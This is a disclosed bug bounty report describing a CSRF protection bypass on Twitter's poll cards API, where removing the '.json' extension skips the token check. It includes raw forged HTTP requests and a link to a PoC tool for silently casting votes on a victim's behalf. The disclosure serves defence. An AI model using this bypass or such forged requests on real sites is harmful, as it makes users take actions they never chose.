# CSRF on cards API

## Report Details
- **Report ID**: 95555
- **URL**: https://hackerone.com/reports/95555
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-10-24T07:48:10.271Z
- **Disclosed**: 2017-04-11T03:26:55.147Z

## Reporter
- **Username**: filedescriptor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi,
I would like to report an CSRF issue on the cards API endpoint (/i/cards/api/v1.json).

##Detail
Currently the endpoint is responsible for poll cards (maybe more to come). When a user votes, a request will be sent to this endpoint to record the user's selected choice. By default there's a CSRF protection in place which looks for *authenticity_token* in the query part of the URI. However, such check only appears for the exact path (*/i/cards/api/v1.json*). Given that the server seems to relax path extension, attackers can circumvent the protection by using the path */i/cards/api/v1* (without .json) for the request.

This is how a normal request looks like:
```http
POST https://twitter.com/i/cards/api/v1.json?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1
Host: twitter.com
Cookie: foo=bar

{"twitter:string:card_uri":"card://657629230759415808","twitter:long:original_tweet_id":"657629231309041664","twitter:string:selected_choice":"2"}
```

without providing a valid CSRF token, it will return a HTTP 403 error.
Now that we trim the extension part (**v1.json** to **v1**) and resend it:
```http
POST https://twitter.com/i/cards/api/v1?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1
Host: twitter.com
Cookie: foo=bar

{"twitter:string:card_uri":"card://657629230759415808","twitter:long:original_tweet_id":"657629231309041664","twitter:string:selected_choice":"2"}
```

it still lacks the CSRF token, but this time it returns HTTP 200 and the vote is successfully made.
All in all, attackers can abuse it and make victims to vote without noticing.

#PoC
Here's a handy tool to CSRF any poll. You may also just intercept the vote request to validate the issue.
1. Go to http://innerht.ml/pocs/twitter-cards-csrf/
2. Fill in the poll card's information you want to CSRF (e.g. for https://twitter.com/Bugcrowd/status/657629231309041664 the parameters are
tweet_id: 657629231309041664, card_uri: card://657629230759415808, selected_choice: 2)
3. Click the button to activate the attacke. Of course the whole process can be silent.

## Attachments
No attachments
